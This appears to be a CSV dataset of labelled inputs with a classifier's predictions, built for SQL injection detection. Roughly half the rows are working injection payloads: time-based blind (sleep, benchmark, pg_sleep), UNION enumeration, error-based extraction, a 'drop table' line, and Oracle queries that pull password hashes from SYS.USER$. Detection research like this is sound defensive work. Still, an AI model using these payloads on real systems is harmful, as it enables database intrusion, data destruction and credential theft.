payload,label,hardened_pred_label,hardened_pred_score
1 where 5311  =  5311 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,1,0.9999931
SELECT AVG ( Price ) FROM our,0,0,7.82236e-06
SELECT * FROM younger WHERE build = 'rising'  OR leather = 'animal',0,0,7.606027e-06
"SELECT * FROM differ WHERE signal BETWEEN ""living"" AND    ""arrangement""",0,0,7.745708e-06
es2o135mie5to,0,0,7.4895784e-06
"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,1,0.9999932
patrica0,0,0,7.825883e-06
SELECT * FROM mad WHERE Price NOT BETWEEN 10 AND 20,0,0,7.716408e-06
SELECT COUNT ( smoke ) FROM enter,0,0,7.916531e-06
 ; drop table temp --,1,1,0.9999926
SELECT apart ( s )  FROM plant LEFT JOIN,0,0,7.51467e-06
SELECT * FROM each 3,0,0,7.870581e-06
-4410 where 5749  =  5749 or 1317  =  9823--,1,1,0.9999933
SELECT AVG ( dropped ) FROM worth,0,0,8.047701e-06
SELECT COUNT ( neighborhood ) FROM expect,0,0,7.919158e-06
"INSERT INTO slowly  ( sight, tree, feature )  VALUES  ( 'farmer', 'means', 'but' )  ",0,0,7.423588e-06
"INSERT INTO prize ( low, opinion, action, division, though, taken )  VALUES  ( 'order', 'spider'. dust', 'fort', 'view', 'factor', 'bigger' )  ",0,0,7.453261e-06
"1%'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  '%'  =  '",1,1,0.9999932
SELECT lion ( s )  FROM list UNION,0,0,7.4658033e-06
-8636'   )    )     )   or 4301  =  7212--,1,1,0.9999932
-8056   )    )    as botl where 9225  =  9225 or   (  1182  =  7641  )  *7641--,1,1,0.9999931
"1' and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,0.9999933
SELECT AVG ( different ) FROM that,0,0,7.775935e-06
diana,0,0,8.067304e-06
" select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",1,1,0.9999932
"-8319""   )    )    or 7878  =  5970 and    (    (   ""jcaz"" like ""jcaz",1,1,0.9999932
7ngr5ta3ente,0,0,7.5029757e-06
"   SELECT COUNT ( many ) , star FROM truth BY reach",0,0,7.735889e-06
benalup-casas viejas,0,0,7.4559557e-06
SELECT COUNT ( flies ) FROM gate,0,0,7.4552304e-06
"1' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,0.9999932
liesemer,0,0,8.011391e-06
 (  8362  =  9139  )  *9139,1,1,0.9999932
SELECT * FROM living,0,0,8.070251e-06
"-9514   )    )    as xdkw where 4975  =  4975 union all select 4975,4975,4975,4975#",1,1,0.9999932
SELECT * FROM studied  WHERE edge = bow,0,0,7.642003e-06
FROM  ( SELECT DISTINCT care FROM thy ) ,0,0,7.714274e-06
 UPDATE collect SET couple = 'battle'WHERE bigger = 'earth',0,0,7.564361e-06
"1""   )    )    as zbfj where 2285  =  2285",1,1,0.9999933
SELECT say ( s )  FROM camera FULL OUTER JOIN,0,0,7.716363e-06
1 and   (  3437  =  2271  )  *2271,1,1,0.9999933
4259,0,0,8.038268e-06
beverly.lormer@decobiombo.ni,0,0,7.4426925e-06
3.38196E+14,0,0,7.4980117e-06
select   (  case when   (  5768  =  9169  )   then 5768 else 1/  (  select 0  )   end  )  --,1,1,0.9999931
"   SELECT Employees.volume, COUNT ( Orders.adjectiveID )  AS refusedFROM    ( OrdersINNER JOIN breakfast ON Orders.catchID  =  Employees.songID ) ",0,0,7.395987e-06
"1""  )   as ebvt where 5305  =  5305",1,1,0.9999933
"-7813""   )    )    as yvyl where 5172  =  5172 union all select 5172,5172#",1,1,0.9999932
SELECT * FROM court WHERE his = 'perhaps',0,0,8.041105e-06
"   SELECT troops,thousand,someone,energy,took     (  (  handle JOIN hello ON union.fish =  little.natural )   INNER JOIN keepON Orders.sides =  police.morningID ) ",0,0,7.508903e-06
SELECT * FROM gravity,0,0,8.266856e-06
SELECT MIN ( mud )  AS parallel FROM around,0,0,7.647165e-06
"1  )   as agex where 8167  =  8167 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,1,0.9999932
"1'  )   union all select null,null,null,null,null,null,null,null,null--",1,1,0.9999932
"SELECT * FROM attack WHERE walk BETWEEN ""jet"" AND    ""dog""",0,0,7.800669e-06
SELECT * FROM suit 3 SELECT * FROM blue,0,0,7.787066e-06
"  SELECT skin,brass,smaller FROM dug LEFT JOIN Orders ON coast.neverID =  adjective.stronger ORDER BY chicken.two",0,0,7.3734363e-06
anz1@hiperbilbao.fj,0,0,7.4378604e-06
DELETE FROM ago WHERE completely = 'upon',0,0,7.719992e-06
select   (  case when   (  3859  =  6938  )   then 3859 else 3859*  (  select 3859 from mysql.db  )   end  )  #,1,1,0.9999932
select * from users where id  =  1   or 1  =  1 -- 1,1,1,0.9999933
"1""   )    )    as jrld where 3488  =  3488",1,1,0.9999933
84996241v,0,0,7.683966e-06
1'||  (  select 'goen' from dual where 8586  =  8586,1,1,0.9999933
SELECT * FROM habit FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM lion,0,0,7.5879507e-06
SELECT TOP 3 * FROM perhaps WHERE coming = 'telephone' SELECT * FROM nearest,0,0,7.7878985e-06
vahid,0,0,7.849637e-06
herrmann@codwatw.edu,0,0,7.439478e-06
"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ican' like 'ican",1,1,0.9999932
"  SELECT log,front FROM night WHERE thirty = 'unhappy' UNION SELECT oldest, particles FROM stepped",0,0,7.4391373e-06
"-3628"" or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1,1,0.9999931
"1'  )   union all select null,null,null,null--",1,1,0.9999933
 )    )    or sleep  (  __TIME__  )    =  ',1,1,0.9999932
SELECT * FROM solid,0,0,7.651768e-06
"1'+  (  select 'qmtx' where 6992  =  6992 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,0.9999932
"-5411%""   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""%""  =  """,1,1,0.9999931
SELECT COUNT ( forgot ) FROM gun,0,0,7.838805e-06
SELECT MIN ( piano )  AS voyage FROM experiment,0,0,7.37874e-06
SELECT come FROM frighten,0,0,7.6188912e-06
1  )   where 8375  =  8375,1,1,0.9999933
"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""eran""  =  ""eran",1,1,0.9999932
37795,0,0,8.050603e-06
-6178   )    )    as lygb where 9559  =  9559 or   (  8459  =  8459  )  *4906--,1,1,0.9999931
SELECT * FROM make FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM magic,0,0,7.578636e-06
"  SELECT Orders.hairrID, Employees.ranch, Employees.teacher FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.askID ORDER BY Orders.knifeID",0,0,7.3624747e-06
"1""   )    )     )   rlike   (  select   (  case when   (  7975  =  2446  )   then 1 else 0x28 end   )    )    and    (    (     (  ""qixm"" like ""qixm",1,1,0.9999931
SELECT * FROM surrounded FETCH FIRST 50 PERCENT ROWS ONLY,0,0,7.5664825e-06
 UPDATE hay SET age = 'speak'WHERE secret = 'cattle',0,0,7.468502e-06
SELECT * FROM with ORDER BY science,0,0,7.782256e-06
select case when 7649  =  9297 then 1 else null end--,1,1,0.9999932
SELECT TOP 50 PERCENT * FROM busy,0,0,7.764605e-06
"1"" where 9173  =  9173 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",1,1,0.9999932
1' where 8945  =  8945 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,1,0.9999932
SELECT * FROM port WHERE Price NOT BETWEEN 10 AND 20,0,0,7.674753e-06
select   (  case when   (  6166  =  3364  )   then 6166 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,1,0.9999931
34120,0,0,8.070729e-06
"1  )   as vzyk where 5103  =  5103 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,1,0.9999931
darcange1,0,0,7.643344e-06
SELECT * FROM chicken ORDER BY beautiful DESC,0,0,7.641056e-06
1%'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,1,0.9999932
SELECT * FROM Customers GO; EXEC SelectAllCustomers; CREATE PROCEDURE SelectAllCustomers @City nvarchar ( 30 )  AS,0,0,7.641792e-06
SELECT * FROM action WHERE broad = 'fight' LIMIT 3,0,0,7.642747e-06
SELECT * FROM wp_posts WHERE ID  =  28705 LIMIT 1,0,0,7.6174165e-06
"1""   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  ""opdl""  =  ""opdl",1,1,0.9999932
valdelagua del cerro,0,0,7.4813834e-06
SELECT TOP 3 * FROM hung WHERE pan = 'practical' SELECT * FROM fed,0,0,8.051502e-06
tamer,0,0,8.066927e-06
"  SELECT consistID AS ID, orange AS volume FROM example",0,0,7.873861e-06
SELECT COUNT ( jack ) FROM failed,0,0,7.991452e-06
SELECT * FROM hole WHERE son = 'wish',0,0,7.5753337e-06
herodes,0,0,8.139863e-06
kristl@voragolive.vn,0,0,7.439109e-06
SELECT AVG ( kind )  FROM strike  SELECT SUM ( cookies ) ,0,0,7.446917e-06
6.58835E+15,0,0,7.429736e-06
"1'  )   as rqfq where 7077  =  7077 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,0.9999933
-9555'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'rwpq' like 'rwpq,1,1,0.9999932
"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",1,1,0.9999932
stanczak-kasem@movil-google.tj,0,0,7.4877003e-06
SELECT * FROM choice WHERE substance = 'youth' LIMIT 3,0,0,7.5839935e-06
"1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  # ehsr",1,1,0.9999933
SELECT * FROM gone WHERE automobile = 'smaller' LIMIT 3,0,0,7.690291e-06
 UPDATE breakfast SET science = 'strong'WHERE finish = 'main',0,0,7.445014e-06
castrillo de la valduerna,0,0,7.4711024e-06
1'  )   where 3730  =  3730 and sleep  (  5  )  #,1,1,0.9999933
guntekin,0,0,7.833282e-06
43814,0,0,8.08913e-06
"  SELECT driverID AS ID, string AS year FROM event",0,0,7.770093e-06
SELECT * FROM kitchen,0,0,8.188955e-06
1' where 6003  =  6003 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1,1,0.9999932
SELECT COUNT ( special ) FROM west,0,0,7.90431e-06
"1'||  (  select 'jfxs' from dual where 5485  =  5485 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,0.9999932
"-8609' union all select 9384,9384,9384,9384--",1,1,0.9999933
19294,0,0,8.061436e-06
"  (  select   (  case when   (  3531  =  3531  )   then   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 3531 end   )    )   ",1,1,0.9999932
SELECT * FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id  )  WHERE  ( post_type  =  'page' AND post_status  =  'publish' )  AND wp_postmeta.meta_key  =  '_wp_page_template' AND wp_postmeta.meta_value  =  'template/reset_password.php' ORDER BY wp_posts.post_title ASC,0,0,7.840711e-06
SELECT AVG ( journey ) FROM orange SELECT SUM ( farm ) ,0,0,7.563741e-06
deyecta,0,0,7.752988e-06
"-5170'   )    )    as ovbf where 4833  =  4833 union all select 4833,4833,4833,4833--",1,1,0.9999932
legarreta sant,0,0,7.5684457e-06
SELECT * FROM beginning,0,0,7.950623e-06
3.99279E+14,0,0,7.678567e-06
"-9451""   )    )     )   union all select 4211,4211,4211,4211,4211,4211,4211--",1,1,0.9999932
SELECT TOP 3 * FROM article WHERE expression = 'alphabet',0,0,7.6618235e-06
1 where 6173  =  6173,1,1,0.99994576
26%,1,1,0.99998915
SELECT * FROM above,0,0,8.112879e-06
"  SELECT sale,fewer,taught FROM stems LEFT JOIN Orders ON law.bicycleID =  fifty.thy ORDER BY rapidly.fastened",0,0,7.794987e-06
"INSERT INTO teeth ( blue, weak, coal, missing, easily, coal )  VALUES  ( 'water', 'like'. herd', 'pan', 'block', 'trip', 'forgotten' )  ",0,0,7.4710597e-06
SELECT AVG ( Price ) FROM consist,0,0,7.828644e-06
"iif  (  9342  =  6508,1,1/0  )  ",1,1,0.9999932
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,1,0.9999932
SELECT TOP 50 PERCENT * FROM nearby SELECT * FROM serious FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM clear,0,0,7.5952994e-06
"iif  (  7889  =  5114,1,1/0  )  ",1,1,0.9999932
"   SELECT nest, leave+ ', ' + wool+ ' ' + coffee+ ', ' + top AS greater  FROM rod",0,0,7.352357e-06
"  SELECT sitID AS ID, drop AS reach FROM care",0,0,7.855074e-06
"1   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,0.9999932
blasinda,0,0,7.833701e-06
"1""  )   as qnmd where 5642  =  5642",1,1,0.9999933
1'  )   where 7541  =  7541,1,1,0.9999932
huari,0,0,8.093466e-06
66381379k,0,0,7.5538e-06
SELECT weigh ( s )  FROM pole FULL OUTER JOIN,0,0,7.4648706e-06
SELECT * FROM lower WHERE social = 'probably',0,0,7.95468e-06
"   SELECT COUNT ( chamber ) , stock FROM know BY congress",0,0,7.613618e-06
"codigo correspondencia oficial correos-telegrafos 86,",0,0,7.47791e-06
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 6053 )  ORDER BY meta_id ASC",0,0,7.5224566e-06
"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,1,0.9999932
4.97922E+15,0,0,7.5213306e-06
"1'   )    )    as qzyp where 5081  =  5081 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,1,0.9999932
SELECT * FROM college ORDER BY jar DESC,0,0,7.773503e-06
if  (  4907  =  9581  )   select 4907 else drop function apqw--,1,1,0.9999932
wostrikoff@hojainformativas.gi,0,0,7.4421037e-06
SELECT * FROM amount WHERE    NOT factory = 'school',0,0,7.9714555e-06
SELECT COUNT ( wherever ) FROM plus,0,0,7.899396e-06
"  SELECT degree,forward,train FROM health LEFT JOIN Orders ON string.colorID =  pole.difficult ORDER BY dog.farm",0,0,7.4742593e-06
"  SELECT * FROM hang WHERE fifteen NOT IN  ( 'three', 'speech', 'furniture' )  ",0,0,7.4731975e-06
"-3518  )   union all select 1877,1877,1877,1877#",1,1,0.9999932
DELETE FROM door WHERE grow = 'small',0,0,7.688562e-06
SELECT * FROM put ORDER BY cowboy DESC,0,0,7.808586e-06
"1""   )    )    as bbkl where 5686  =  5686",1,1,0.9999933
SELECT TOP 50 PERCENT * FROM position,0,0,7.650257e-06
"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",1,1,0.9999933
SELECT AVG ( mistake )  FROM principal  SELECT SUM ( opinion ) ,0,0,7.4144045e-06
"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'gfxr'  =  'gfxr",1,1,0.9999932
ob7491,0,0,7.830855e-06
"1'   )    )    union all select null,null,null,null,null,null,null,null#",1,1,0.9999932
"c/ las niadas, 67 9?f",0,0,7.427398e-06
"   SELECT powder,new,best,such,live     (  (  wrapped JOIN being ON only.tiny =  copy.noise )   INNER JOIN shownON Orders.perfectly =  satisfied.streetID ) ",0,0,7.746993e-06
SELECT TOP 50 PERCENT * FROM arm,0,0,7.877985e-06
"1"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  ",1,1,0.9999932
"  SELECT * FROM exactly WHERE there IN  ( 'individual', 'neighbor', 'report' )  ",0,0,7.740856e-06
"1'  )   where 2121  =  2121 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,0.9999932
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,1,0.9999932
5h5c8,0,0,7.5131293e-06
ecija 51 12-h,0,0,7.5158164e-06
SELECT * FROM blind WHERE together = 'fresh',0,0,7.783814e-06
SELECT TOP 3 * FROM wooden SELECT * FROM moving 3SELECT * FROM wonderful,0,0,7.647865e-06
SELECT * FROM not WHERE warn NOT LIKE '[tin]%',0,0,7.802551e-06
SELECT * FROM clothes WHERE Price NOT BETWEEN 10 AND 20,0,0,7.6646e-06
thiel,0,0,8.04916e-06
"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1,1,0.9999931
"  UPDATE original SET what =  'who', City =  'exciting' WHERE congress =  against",0,0,7.4907643e-06
"1'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   'pcim'  =  'pcim",1,1,0.9999932
"1'  )   as nvqk where 3917  =  3917 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,0.9999932
SELECT * FROM friend FETCH FIRST 3 ROWS ONLY,0,0,7.750082e-06
SELECT * FROM  ( SELECT night FROM floating ) ,0,0,7.891678e-06
"  UPDATE bank SET attached =  'thrown', City =  'cut' WHERE using =  origin",0,0,7.48825e-06
"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,1,0.9999932
regueras de arriba,0,0,7.5260373e-06
"  SELECT soilID AS ID, muscle AS many FROM band",0,0,7.437414e-06
veneranda,0,0,7.840375e-06
2829,0,0,8.0758255e-06
SELECT * FROM glad WHERE source = 'fairly'  OR widely = 'image',0,0,7.79927e-06
"c/ gerardo de alvear, 119 10f",0,0,7.433691e-06
polanco,0,0,8.119117e-06
"1  )   as qjbd where 2808  =  2808   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1,1,0.9999932
"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'lvck'  =  'lvck",1,1,0.9999931
brendel@esposo.com.lk,0,0,7.441607e-06
"  SELECT * FROM cotton WHERE kids NOT IN  ( 'within', 'connected', 'pattern' )  ",0,0,7.561707e-06
"1%'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",1,1,0.9999932
"-9370'  )   where 7070  =  7070 or make_set  (  9354  =  9354,7185  )  --",1,1,0.9999932
SELECT TIME ( NULL ) ;,0,0,7.57675e-06
 (  select   (  case when   (  3592  =  3592  )   then 3592 else 3592*  (  select 3592 from information_schema.character_sets  )   end   )    ) ,1,1,0.9999932
